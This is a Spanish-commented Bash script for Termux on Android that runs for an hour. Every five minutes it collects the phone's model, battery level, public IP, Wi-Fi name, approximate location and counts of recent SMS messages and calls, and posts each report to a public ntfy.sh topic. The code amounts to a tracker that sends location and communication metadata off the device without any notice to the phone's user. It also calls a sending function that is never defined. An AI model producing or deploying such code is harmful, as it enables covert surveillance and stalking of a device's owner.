#!/bin/bash
# Monitoreo Inteligente (Duración: 60 minutos)

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/JudaszJunsn9"
INTERVALO=300  # 5 minutos entre actualizaciones
DURACION_MIN=60 # Duración total en minutos
DEBUG=true

# ===== FUNCIONES PRINCIPALES =====
generar_reporte() {
    # 1. Información del dispositivo
    local modelo=$(getprop ro.product.model)
    local android=$(getprop ro.build.version.release)
    local bateria=$(termux-battery-status 2>/dev/null | jq -r '"\(.percentage)% (\(.status))"')
    
    # 2. Datos de red
    local ip_publica=$(curl -sS ifconfig.me)
    local wifi=$(termux-wifi-connectioninfo 2>/dev/null | jq -r '.ssid // "Celular"')
    
    # 3. Ubicación aproximada
    local ubicacion=$(termux-location -p network 2>/dev/null | jq -r '"\(.latitude),\(.longitude) ±\(.accuracy)m"' 2>/dev/null)
    
    # 4. Resumen de actividad
    local nuevos_sms=$(termux-sms-list -l 2 --timestamp $(date +%s -d "1 hour ago") 2>/dev/null | jq length)
    local llamadas=$(termux-call-log -l 5 2>/dev/null | jq 'map(select(.date >= (now - 3600|floor)) | length')
    
    # Construir mensaje
    echo "📈 INFORME CONSOLIDADO (Última hora)
    
📱 Dispositivo: $modelo
🔄 Android: $android
🔋 Batería: $bateria

📶 Red: $wifi
🌐 IP Pública: $ip_publica
📍 Ubicación: ${ubicacion:-No disponible}

📞 Llamadas recientes: $llamadas
📩 SMS nuevos: $nuevos_sms

⏳ Próxima actualización: en $((INTERVALO/60)) minutos
🕒 Finaliza en: $(date '+%H:%M' -d "+$((DURACION_MIN - (ITERACION*INTERVALO/60))) minutos")"
}

# ===== PROGRAMA PRINCIPAL =====
ITERACION=0
MAX_ITERACIONES=$((DURACION_MIN*60/INTERVALO))

[ "$DEBUG" = true ] && echo "🔍 Iniciando monitoreo por $DURACION_MIN minutos (Actualizaciones cada $((INTERVALO/60)) minutos)"

while [ $ITERACION -lt $MAX_ITERACIONES ]; do
    # Enviar reporte consolidado
    enviar_ntfy "$(generar_reporte)"
    
    # Incrementar contador
    ITERACION=$((ITERACION+1))
    
    # Mostrar progreso en terminal (opcional)
    [ "$DEBUG" = true ] && echo "🔄 Iteración $ITERACION/$MAX_ITERACIONES - $(date '+%H:%M:%S')"
    
    # Esperar hasta la próxima iteración
    sleep $INTERVALO
done

[ "$DEBUG" = true ] && echo "✅ Monitoreo completado después de $DURACION_MIN minutos"
enviar_ntfy "🏁 Monitoreo completado después de $DURACION_MIN minutos"
